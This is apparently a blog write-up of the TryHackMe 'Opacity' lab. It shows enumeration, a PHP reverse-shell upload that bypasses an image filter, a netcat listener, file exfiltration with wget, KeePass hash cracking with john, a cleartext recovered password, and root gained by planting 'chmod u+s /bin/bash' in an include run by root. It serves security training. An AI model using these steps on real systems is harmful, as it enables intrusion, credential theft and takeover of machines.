---
layout: post
author: L0
---

# THM-Opacity

![image](/images/Pasted image 20230822084619.png)

[TryHackMe - Opacity](https://tryhackme.com/room/opacity)
## Enumeration
### nmap
```shell
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

the nmap scan revealed 4 open ports.

- Port 22 - ssh service
- Port 80 - apache web server
- Port 139 & 445 smb service
### enum4linux
first i started enumerating the smb service with *enum4linux*

```shell
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\sysadmin (Local User)

```

i just got the username *sysadmin*.
### website on port 80
the web server is hosting a login page. common credentials are not working.

![image](/images/Pasted image 20230508223038.png)
### directory fuzzing
directory fuzzing got me a hit with a path to the *cloud* resource.

```shell
$ ffuf -w `fzf-wordlist` -u http://opacity.thm/FUZZ -e ".php"
...
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 45ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
login.php               [Status: 200, Size: 848, Words: 115, Lines: 35, Duration: 57ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 38ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 39ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]
cloud                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 37ms]

```
### php-reverse-shell
with this form a user is able to upload images. since the webserver is an apache instance, i tried to upload a *php-reverse-shell* script. i needed to bypass the filtering. the form only accepts files with ".jpg" extension.

![image](/images/Pasted image 20230821123911.png)

but after some try and error i got a reverse shell. of course i started a listener with `nc -lvnp 4444` to catch the shell.

![image](/images/Pasted image 20230821125815.png)

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.1.199] from (UNKNOWN) [10.10.155.163] 49288
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 10:57:30 up 27 min,  0 users,  load average: 0.00, 0.00, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$

```
### keepass database file
i looked in the home directory and other places for interesting information and found a keepass database file in the */opt* directory.

```shell
www-data@opacity:/opt$ ls
dataset.kdbx
```

i downloaded the file to my machine.

>start server with `python3 -m http.server 9090`
>and download on attacker with `wget http://<victim-ip>:9000/file`
{: .prompt-info}

i used *keepass2john* to create a hash for *john* to work with. after that i used *john* and the *rockyou* password list to get the password.

```shell
$ keepass2john ./dataset.kdbx > dataset.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt dataset.hash
```

```shell
dataset:741852963
```

then i used the password with the *keepassxc-cli show -s* command to get the stored password of *sysadmin*

```shell
$ keepassxc-cli show -s ./dataset.kdbx user:password 
Enter password to unlock ./dataset.kdbx: 
Title: user:password
UserName: sysadmin
Password: Cl0udP4ss40p4city#8700
URL: 
Notes: 
Uuid: {c116cbb5-f7c3-9a74-04c2-75019b28cc51}
Tags: 
```

with that password i was able to log into the *sysadmin* account via ssh. and got the first flag.

```shell
Last login: Wed Feb 22 08:13:43 2023 from 10.0.2.15
sysadmin@opacity:~$ ls
local.txt  scripts
sysadmin@opacity:~$ cat local.txt
66****************************e2
```
## Privilege Escalation
the first thing that got my attention was the *scripts* directory in the *home* directory of *sysadmin*.
the file *scripts.php* inside that folder was owned by root. i checked for cronjobs but could not find any. but when i monitored the processes with *pspy* i saw that this script got executed very regular by the root user.

```php
<?php
//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>

```

the script imports another php file from the *lib* directory. when i checked this folder and the permissions i saw, that i owned that folder. so i was able to rename the imported file and create another with the same name instead.

```shell
sysadmin@opacity:~/scripts/lib$ ll
total 136
drwxr-xr-x 2 sysadmin root      4096 Aug 21 21:25 ./
rwxr-xr-x 3 root     root      4096 Jul  8  2022 ../
-rw-r--r-- 1 root     root      9458 Jul 26  2022 application.php
-rw-rw-r-- 1 root     root      4182 Jul 26  2022 backup.inc.php
-rw-r--r-- 1 root     root     24514 Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root     11222 Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root      7595 Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root      4828 Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root      3243 Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root      1325 Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root      1465 Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root     10548 Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root     16469 Jul 26  2022 registry.php
-rw-r--r-- 1 root     root      6862 Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root      3921 Jul 26  2022 xmlapi.php*
```

and this is the contend of the new file. i execute a OS command that sets the SUID bit for the bash binary

```php
sysadmin@opacity:~/scripts/lib$ cat backup.inc.php
<?php
$cmd = shell_exec('chmod u+s /bin/bash');
?>
```

the script got called by root and i checked the permissions. the SUID bit was set and i got a root shell with `/bin/bash -p` 

```shell
sysadmin@opacity:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
sysadmin@opacity:~$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat proof.txt
ac***************************20e
```

and i got the last flag.

[L0]
